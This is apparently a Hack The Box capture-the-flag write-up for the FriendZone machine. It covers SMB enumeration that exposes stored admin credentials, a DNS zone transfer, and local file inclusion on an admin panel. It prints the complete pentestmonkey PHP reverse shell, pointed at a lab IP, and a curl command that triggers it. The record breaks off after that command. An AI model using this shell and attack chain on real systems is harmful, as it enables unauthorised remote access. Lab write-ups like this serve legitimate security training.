# FriendZone

10.10.10.123

# Enumeration

## NMAP

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo=
|   256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
53/tcp  open  domain      syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c14418685e8b468dfc7d888b1123781c
| SHA-1: 88d2e8ee1c2cdbd3ea552e5ecdd4e94c4c8b9233
| -----BEGIN CERTIFICATE-----
| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
| fv9s+GxKNvsBqDBX
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-08-18T07:23:17
|_  start_date: N/A
|_clock-skew: mean: -1h00m06s, deviation: 1h43m54s, median: -7s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34347/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18531/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37865/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-08-18T10:23:17+03:00
```

### Ports Open

* 21 - FTP
* 22 - SSH
* 53 - DNS
* 80 - Apache 2.4.29
* 139 - Samba
* 443 - SSL
* 445 - Samba

* Domain Found: friendzone.red - Added to /etc/hosts

## SMB SHARES

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ smbclient -L //friendzone.red              
Password for [WORKGROUP\REDACTED]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        REDACTEDral         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        HTB                  LEGACY
        WORKGROUP            FRIENDZONE
```

### Grabbing creds.txt from share "REDACTEDral"

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ smbclient -N //friendzone.red/REDACTEDral 
Try "help" to get a list of possible commands.
smb: \> ls -lah
NT_STATUS_NO_SUCH_FILE listing \-lah
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                3545824 blocks of size 1024. 1645204 blocks available
smb: \> mget *
Get file creds.txt? yes
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

#### Contents of creds.txt

```txt
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

### "Development share"

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ smbclient //friendzone.red/Development
Password for [WORKGROUP\REDACTED]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:03:49 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022

                3545824 blocks of size 1024. 1631028 blocks available
```

* No files present in this share.

#### Permissions of "Development"

Its always a good idea to check if you have write permissions for a share. 

```bash
smb: \> put creds.txt
putting file creds.txt as \creds.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Fri Aug 18 03:44:16 2023
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           A       57  Fri Aug 18 03:44:17 2023

                3545824 blocks of size 1024. 1630888 blocks available
```

* Anonymous write access on //friendzone.red/Development

## Port 80 Webserver

Not much on the front page except a dummy email and phone number.

### Directory Enumeration

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ feroxbuster -u http://friendzone.red -w /opt/raft-small-words.txt -x php,html,txt,js -o dir-enum/80.ext.ferox

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://friendzone.red
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ REDACTEDlol
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ dir-enum/80.ext.ferox
 💲  Extensions            │ [php, html, txt, js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       12l       31w      324c http://friendzone.red/index.html
200      GET       92l      454w    37253c http://friendzone.red/fz.jpg
200      GET       12l       31w      324c http://friendzone.red/
301      GET        9l       28w      320c http://friendzone.red/wordpress => http://friendzone.red/wordpress/
200      GET        1l        2w       13c http://friendzone.red/robots.txt
[>-------------------] - 17s     3791/215060  16m     found:5       errors:0      
[####################] - 13m   215060/215060  0s      found:5       errors:6      
[####################] - 13m   215050/215050  281/s   http://friendzone.red/ 
[####################] - 0s    215050/215050  1114249/s http://friendzone.red/wordpress/ => Directory listing
```

* Interesting hits - /wordpress/, /robots.txt
* Nothing useful in /robots.txt
* /wordpress is an empty directory & running WPScan on it yields no results.

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ wpscan -v --detection-mode aggressive --api-token '[API KEY HERE]' -e --plugins-detection aggressive --url http://friendzone.red/         
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n

Scan Aborted: The remote website is up, but does not seem to be running WordPress.
```

* Not yet sure why this is happening.

### Subdomain Enumeration

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ gobuster vhost -u http://friendzone.red -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r -o fz.dns.gobuster
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://friendzone.red
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/08/18 03:55:01 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.friendzone.red Status: 400 [Size: 422]
Progress: 4948 / 4990 (99.16%)
===============================================================
2023/08/18 03:55:39 Finished
===============================================================
```

* No subdomains found

## Port 443 (SSL) Webserver

### Directory Enumeration

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ feroxbuster -u https://friendzone.red -w /opt/raft-small-words.txt -k -x php,html,txt,js -o dir-enum/443.ext.ferox

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://friendzone.red
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ REDACTEDlol
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ dir-enum/443.ext.ferox
 💲  Extensions            │ [php, html, txt, js]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c https://friendzone.red/js => https://friendzone.red/js/
301      GET        9l       28w      318c https://friendzone.red/admin => https://friendzone.red/admin/
200      GET       14l       30w      238c https://friendzone.red/index.html
200      GET        0l        0w  2199433c https://friendzone.red/e.gif
200      GET       14l       30w      238c https://friendzone.red/
301      GET        9l       28w      318c https://friendzone.red/js/js => https://friendzone.red/js/js/
200      GET        1l       29w      198c https://friendzone.red/js/js/index.php
200      GET        1l       29w      198c https://friendzone.red/js/js/
[############>-------] - 11m   273247/430130  0s      found:8       errors:67     
🚨 Caught ctrl+c 🚨 saving scan state to ferox-https_friendzone_red-1692346067.state ...
[############>-------] - 11m   273261/430130  0s      found:8       errors:67     
[############>-------] - 11m   136860/215050  201/s   https://friendzone.red/ 
[####################] - 3s    215050/215050  67098/s https://friendzone.red/js/ => Directory listing
[####################] - 1s    215050/215050  145010/s https://friendzone.red/admin/ => Directory listing
[############>-------] - 11m   136325/215050  201/s   https://friendzone.red/js/js/ 
```

* /admin is an empty directory.
* /js/js/index.php is interesting

#### /js/js/index/.php

```html
<p>Testing some functions !</p><p>I'am trying not to break things !</p>ZlpjZFJ4MFFYajE2OTIzNDYxNDlhaENnR2N0ZFQx<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

* Interesting note, a hint perhaps.

## Digging around

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ dig version.bind CHAOS TXT @friendzone.red

; <<>> DiG 9.18.12-1-Debian <<>> version.bind CHAOS TXT @friendzone.red
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9583
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: deb580e9911d5aa6838b7eba64df27749f107833f98c2236 (good)
;; QUESTION SECTION:
;version.bind.                  CH      TXT

;; ANSWER SECTION:
version.bind.           0       CH      TXT     "9.11.3-1ubuntu1.2-Ubuntu"

;; AUTHORITY SECTION:
version.bind.           0       CH      NS      version.bind.

;; Query time: 72 msec
;; SERVER: 10.10.10.123#53(friendzone.red) (UDP)
;; WHEN: Fri Aug 18 04:10:36 EDT 2023
;; MSG SIZE  rcvd: 120
```

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ dig any friendzone.red   

; <<>> DiG 9.18.12-1-Debian <<>> any friendzone.red
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 46238
;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1220
; COOKIE: f8897506baead0972839f3fc64df22ae07ea3fdd0fe079ce (good)
;; QUESTION SECTION:
;friendzone.red.                        IN      ANY

;; ANSWER SECTION:
friendzone.red.         600     IN      SOA     ns1.tacomadc.com. admin.friendzone.red. 2023080801 86400 10800 604800 300
friendzone.red.         600     IN      A       162.254.207.62
friendzone.red.         600     IN      NS      ns1.tacomadc.com.
friendzone.red.         600     IN      NS      ns2.tacomadc.com.

;; Query time: 1071 msec
;; SERVER: 192.168.43.1#53(192.168.43.1) (TCP)
;; WHEN: Fri Aug 18 03:50:13 EDT 2023
;; MSG SIZE  rcvd: 177
```

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ dig axfr friendzone.red @10.10.10.123     

; <<>> DiG 9.18.12-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 75 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Fri Aug 18 04:25:07 EDT 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

#### Subdomains

* administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red admin.friendzone.red

## administrator1.friendzone.red

### Directory Enumeration

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ feroxbuster -u https://administrator1.friendzone.red -w /opt/raft-small-words.txt -k -o dir-enum/adm1.friendzone.ferox

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://administrator1.friendzone.red
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ REDACTEDlol
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ dir-enum/adm1.friendzone.ferox
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      349c https://administrator1.friendzone.red/images => https://administrator1.friendzone.red/images/
200      GET        1l        2w        7c https://administrator1.friendzone.red/login.php
200      GET      122l      307w     2873c https://administrator1.friendzone.red/
200      GET       57l      242w    20127c https://administrator1.friendzone.red/images/a.jpg
200      GET        0l        0w   400557c https://administrator1.friendzone.red/images/b.jpg
[####################] - 2m     43014/43014   0s      found:5       errors:5      
[####################] - 2m     43010/43010   341/s   https://administrator1.friendzone.red/ 
[####################] - 7s     43010/43010   5777/s  https://administrator1.friendzone.red/images/ => Directory listing
```

* There is a login page present on /
* When visiting 'login.php' directly there is a message: "Wrong ! "
* The credentials from the SMB share work to login to the page.

### Logged in

#### Directory Enumeration w/cookie

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ feroxbuster -u https://administrator1.friendzone.red -w /opt/raft-small-words.txt -b 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -x php -o dir-enum/adm1-AUTH.friendzone.ferox

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://administrator1.friendzone.red
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ REDACTEDlol
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1
 🔎  Extract Links         │ true
 💾  Output File           │ dir-enum/adm1-AUTH.friendzone.ferox
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      349c https://administrator1.friendzone.red/images => https://administrator1.friendzone.red/images/
200      GET        1l        2w        7c https://administrator1.friendzone.red/login.php
200      GET      122l      307w     2873c https://administrator1.friendzone.red/
200      GET       57l      242w    20127c https://administrator1.friendzone.red/images/a.jpg
200      GET     1401l     8926w   726654c https://administrator1.friendzone.red/images/b.jpg
200      GET        1l       39w      415c https://administrator1.friendzone.red/dashboard.php
[####################] - 2m     43014/43014   0s      found:6       errors:2      
[####################] - 2m     43010/43010   290/s   https://administrator1.friendzone.red/ 
[####################] - 4s     43010/43010   11587/s https://administrator1.friendzone.red/images/ => Directory listing
```

* Not much different /dashboard shows up now.

#### Index page

```txt
Smart photo script for friendzone corp !
* Note : we are dealing with a beginner php developer and the application is not tested yet !


image_name param is missed !

please enter it to show the image

default is image_id=a.jpg&pagename=timestamp
```

## Initial Access

There is a Local File Inclusion in https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp

* The SMB listing states that the share "Files" is located @ /etc/Files, so its likely that the share "Development" is also in /etc/.
* Since the share "Development" has write access, a reverse shell can be uploaded to this share and triggered.

#### PHP Reverse Shell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU REDACTEDral Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU REDACTEDral Public License for more details.
//
// You should have received a copy of the GNU REDACTEDral Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.9';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

* This is the Pentest Monkey reverse shell.

### Catching the shell

* Upload the shell to the "Development" share.
* Visit: "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/SHELLNAMEHERE"
* Important to note, the site appends the .php extension, so you do not need to add it to the URL.

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ curl -k 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/lmao' -b 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1'
```

```bash
